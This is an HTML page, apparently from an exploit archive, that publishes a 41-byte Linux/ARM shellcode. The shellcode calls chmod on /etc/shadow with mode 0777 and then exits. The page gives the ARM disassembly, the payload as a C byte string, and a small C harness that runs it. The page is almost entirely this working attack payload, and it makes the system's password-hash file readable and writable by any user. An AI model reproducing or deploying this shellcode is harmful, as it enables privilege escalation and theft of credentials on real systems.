<html><head><title>Linux/ARM - chmod(/etc/shadow, 0777) - 41 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
Title:     Linux/ARM - chmod(&quot;/etc/shadow&quot;, 0777) - 41 bytes
Date:      2012-09-08
Tested on: ARM1176JZF-S (v6l)
Author:    midnitesnake

00008054 &lt;_start&gt;:
    8054:	e28f6001 	add	r6, pc, #1
    8058:	e12fff16 	bx	r6
    805c:	4678      	mov	r0, pc
    805e:	3012      	adds	r0, #18
    8060:	21ff      	movs	r1, #255	; 0xff
    8062:	31ff      	adds	r1, #255	; 0xff
    8064:	3101      	adds	r1, #1
    8066:	270f      	movs	r7, #15
    8068:	df01      	svc	1
    806a:	1b24      	subs	r4, r4, r4
    806c:	1c20      	adds	r0, r4, #0
    806e:	2701      	movs	r7, #1
    8070:	df01      	svc	1
    8072:	652f      	.short	0x652f
    8074:	732f6374 	.word	0x732f6374
    8078:	6f646168 	.word	0x6f646168
    807c:	46c00077 	.word	0x46c00077
*/
#include &lt;stdio.h&gt;


char shellcode[] = &quot;\x01\x60\x8f\xe2&quot;
                   &quot;\x16\xff\x2f\xe1&quot;
		   &quot;\x78\x46&quot;
		   &quot;\x12\x30&quot;
                   &quot;\xff\x21&quot;
		   &quot;\xff\x31&quot;
                   &quot;\x01\x31&quot;
		   &quot;\x0f\x27&quot;
                   &quot;\x01\xdf&quot;
		   &quot;\x24\x1b&quot;
		   &quot;\x20\x1c&quot;
		   &quot;\x01\x27&quot;
		   &quot;\x01\xdf&quot;
		   &quot;\x2f\x65&quot;
		   &quot;\x74\x63\x2f\x73&quot;
		   &quot;\x68\x61\x64\x6f&quot;
		   &quot;\x77\x00&quot;
		   &quot;\xc0\x46&quot;;

int main()
{
	fprintf(stdout,&quot;Length: %d\n&quot;,strlen(shellcode));
        (*(void(*)()) shellcode)();

return 0;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
